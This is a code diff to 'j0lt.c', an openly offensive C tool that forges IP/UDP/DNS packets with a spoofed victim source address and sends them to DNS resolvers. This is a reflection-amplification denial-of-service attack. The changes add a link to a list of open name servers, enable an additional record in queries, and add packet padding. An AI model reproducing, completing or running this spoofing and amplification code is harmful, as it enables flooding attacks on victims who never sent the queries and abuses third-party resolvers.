@@ -1,5 +1,5 @@
-/* j0lt.c 
- * 
+/* j0lt.c
+ *
  * For using:
  * ./j0lt <RESOLVER IP> <SPOOF_IP> <RESOLVER PORT> <SPOOF PORT> <PAGE>
  *
@@ -7,13 +7,13 @@
  * https://datatracker.ietf.org/doc/html/rfc1700 (NUMBERS)
  * https://datatracker.ietf.org/doc/html/rfc1035 (DNS)
  * https://datatracker.ietf.org/doc/html/rfc1071 (CHECKSUM)
- * https://www.rfc-editor.org/rfc/rfc7648.html (UDP)
+ * https://www.rfc-editor.org/rfc/rfc768.html (UDP)
  * https://www.rfc-editor.org/rfc/rfc760 (IP)
- *
+ * https://public-dns.info/nameserver/ca.txt (List of open name servers)
  * For testing:
  * use ctrl + ` to bring up a terminal then $ unshare -rn. This will give you suid to test this
  * sudo tcpdump -X -n udp port 53
- * 
+ *
  * the-scientist
  */
 
@@ -193,7 +193,7 @@ DEFINE_INSERT_FN(qword, uint64_t)
 #define 	DNS_QDCOUNT_J0LT 0x0001 // num entry question
 #define 	DNS_ANCOUNT_J0LT 0x0000 // num RR answer
 #define 	DNS_NSCOUNT_J0LT 0x0000 // num NS RR 
-#define     DNS_ARCOUNT_J0LT 0x0000 // num RR additional
+#define     DNS_ARCOUNT_J0LT 0x0001 // num RR additional
 // END HEADER VALUES
 
 typedef struct iphdr IPHEADER;
@@ -201,8 +201,7 @@ typedef struct udphdr UDPHEADER;
 typedef HEADER DNSHEADER;
 
 bool
-InsertUDPHeader(
-        uint8_t** buf,
+InsertUDPHeader(uint8_t** buf,
         size_t* buflen,
         UDPHEADER* header,
         PSEUDOHDR* pseudoheader,
@@ -210,22 +209,19 @@ InsertUDPHeader(
 );
 
 bool
-InsertIPHeader(
-        uint8_t** buf,
+InsertIPHeader(uint8_t** buf,
         size_t* buflen,
         IPHEADER* header
 );
 
 bool
-InsertDNSHeader(
-        uint8_t** buf,
+InsertDNSHeader(uint8_t** buf,
         size_t* buflen,
         const DNSHEADER* header
 );
 
 bool
-InsertDNSQuestion(
-        void** buf,
+InsertDNSQuestion(void** buf,
         size_t* buflen,
         const char* domain,
         uint16_t query_type,
@@ -233,13 +229,11 @@ InsertDNSQuestion(
 );
 
 void
-PackDNSHeader(
-        DNSHEADER* dnshdr
+PackDNSHeader(DNSHEADER* dnshdr
 );
 
 void
-PackUDPHeader(
-        UDPHEADER* udphdr,
+PackUDPHeader(UDPHEADER* udphdr,
         PSEUDOHDR* pseudohdr,
         const char* resolverport,
         const char* spoofport,
@@ -247,8 +241,7 @@ PackUDPHeader(
 );
 
 void
-PackIPHeader(
-        IPHEADER* iphdr,
+PackIPHeader(IPHEADER* iphdr,
         PSEUDOHDR* pseudohdr,
         const char* resolvip,
         const char* spoofip,
@@ -257,34 +250,30 @@ PackIPHeader(
 );
 
 bool
-InsertData(
-        void** dst,
+InsertData(void** dst,
         size_t* dst_buflen,
         const void* src,
         size_t src_len
 );
 
 uint16_t
-CheckSum(
-        const uint16_t* addr,
+CheckSum(const uint16_t* addr,
         size_t count
 );
 
 bool
-SendPayload(
-        const uint8_t* datagram,
+SendPayload(const uint8_t* datagram,
         uint32_t daddr,
         uint16_t uh_dport,
         size_t nwritten
 );
 
 void
-PrintHex(
-        const uint8_t* datagram,
+PrintHex(const uint8_t* datagram,
         size_t nwritten
 );
 
-#define DEBUG 0
+#define DEBUG 1
 int
 main(int argc, char** argv)
 {
@@ -422,7 +411,7 @@ PackIPHeader(IPHEADER* iphdr,
     iphdr->ttl = IP_TTL_J0LT;
     iphdr->protocol = getprotobyname("udp")->p_proto;
     iphdr->saddr = htonl(inet_addr(spoofip)); // spoofed ip address to victim
-    iphdr->daddr = htonl(inet_addr(resolvip));   // name server 
+    iphdr->daddr = htonl(inet_addr(resolvip)); // name server 
 
     memset(pseudohdr, 0, sizeof(PSEUDOHDR));
     pseudohdr->protocol = iphdr->protocol;
@@ -605,30 +594,37 @@ InsertDNSQuestion(void** buf,
 
     const char* token;
     char* saveptr, qname[ NS_PACKETSZ ];
-    size_t srclen, domainlen;
+    size_t srclen, domainlen, dif;
     bool status;
 
+    dif = *buflen;
     domainlen = strlen(domain) + 1;
     if (domainlen > NS_PACKETSZ - 1)
         return false;
 
     memcpy(qname, domain, domainlen);
-
-    token = strtok_r(qname, ".", &saveptr);
-    if (token == NULL)
-        return false;
-
-    while (token != NULL) {
-        srclen = strlen(token);
-        insert_byte(( uint8_t** ) buf, buflen, srclen);
-        InsertData(buf, buflen, token, srclen);
-        token = strtok_r(NULL, ".", &saveptr);
+    if (qname[ 0 ] != '.') {
+        token = strtok_r(qname, ".", &saveptr);
+        if (token == NULL) {
+            return false;
+        }
+        while (token != NULL) {
+            srclen = strlen(token);
+            insert_byte(( uint8_t** ) buf, buflen, srclen);
+            InsertData(buf, buflen, token, srclen);
+            token = strtok_r(NULL, ".", &saveptr);
+        }
     }
 
     status = true;
     status &= insert_byte(( uint8_t** ) buf, buflen, 0x00);
     status &= insert_word(( uint8_t** ) buf, buflen, query_type);
     status &= insert_word(( uint8_t** ) buf, buflen, query_class);
+
+    dif -= *buflen;
+    if (dif % 2 != 0) { // pad
+        status &= insert_byte(( uint8_t** ) buf, buflen, 0x00);
+    }
 
     return status;
 }
@@ -654,7 +650,6 @@ InsertData(void** dst,
 uint16_t
 CheckSum(const uint16_t* addr,
         size_t count) {
-
     register uint64_t sum = 0;
 
     while (count > 1) {
